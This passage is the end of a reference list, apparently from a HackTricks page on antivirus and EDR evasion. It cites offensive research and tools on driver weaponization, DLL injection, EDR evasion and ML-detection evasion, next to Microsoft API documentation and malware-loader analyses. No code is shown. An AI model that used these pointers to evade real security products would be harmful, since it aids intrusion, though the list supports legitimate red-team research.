- [36] [Check Point Research - BTR Reforged: Weaponizing Defender's Remediation Driver as a Kernel Operation Primitive](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [MDSec Function Peekaboo companion code](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: Crafting Self-Masking Functions Using LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT - InjectSetConsole source](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - CreatePipe function](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Creating a Child Process with Redirected Input and Output](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian - GhostPack Necromancy: Reforging C# Tools with WasmForge](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge - Compiling C# / .NET Projects](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [DLLParty proof-of-concept and source](https://github.com/epersic/DLLParty)
- [47] [DLLParty — Abusing thread pool internals for shellcodeless DLL injection](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
- [48] [EMBER2024 benchmark dataset and thrember tooling](https://github.com/FutureComputing4AI/EMBER2024)
- [49] [Using EMBER2024 to evaluate red team implants](https://mez0.cc/posts/evaluating-implants-with-ember/)
- [50] [MSec Operations – Evading Machine Learning Based Detections](https://msecops.de/blog/posts/ml-evasion/)
- [51] [Kaspersky Securelist – NetamLoader XAML-based .NET loading framework](https://securelist.com/netamloader/121676)
- [52] [Microsoft Learn – AMSI_RESULT enumeration](https://learn.microsoft.com/en-us/windows/win32/api/amsi/ne-amsi-amsi_result)
- [53] [Microsoft Learn – IAntimalware::Scan method](https://learn.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-iantimalware-scan)
- [54] [Zscaler ThreatLabz - 2CLoader technical analysis](https://zscaler.com/blogs/security-research/2cloader-new-malware-loader-delivering-vidar-and-remus)

{{#include ../banners/hacktricks-training.md}}
